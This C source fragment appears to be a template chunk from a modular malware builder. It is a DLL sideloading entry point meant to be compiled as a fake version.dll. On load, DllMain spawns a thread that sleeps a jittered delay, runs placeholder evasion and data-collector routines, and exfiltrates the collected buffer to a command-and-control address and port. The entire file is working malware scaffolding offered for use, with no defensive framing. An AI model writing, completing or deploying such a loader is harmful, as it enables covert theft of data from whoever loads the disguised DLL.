// chunk: arch/dll_sideload
// depends: core/emit_buffer, exfil/*
// provides: DllMain
// headers: windows.h
// note: DLL sideloading entry — spawns payload in a thread from DllMain.
//       Compile with: -shared -o version.dll source.c version.def

#ifndef CHUNK_ARCH_DLL_SIDELOAD
#define CHUNK_ARCH_DLL_SIDELOAD

static DWORD WINAPI sideload_payload(LPVOID param) {
    (void)param;
    Sleep(3000 + (GetTickCount() % 2000));

{{EVASION_INIT}}

    init_buffer();
    if (!g_data) return 1;

    {{COLLECTOR_CALLS}}

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);

    free(g_data);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    (void)hinstDLL; (void)lpReserved;
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        CreateThread(NULL, 0, sideload_payload, NULL, 0, NULL);
    }
    return TRUE;
}

#endif
